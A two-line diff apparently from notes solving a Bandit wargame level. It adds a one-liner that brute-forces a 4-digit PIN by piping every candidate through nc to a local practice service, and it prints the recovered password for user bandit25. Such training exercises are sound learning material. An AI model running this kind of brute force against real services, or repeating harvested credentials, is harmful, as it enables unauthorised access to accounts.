@@ -1,0 +1,2 @@
+seq -w 0 9999 | awk '{print "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 " $0}' | nc localhost 30002
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
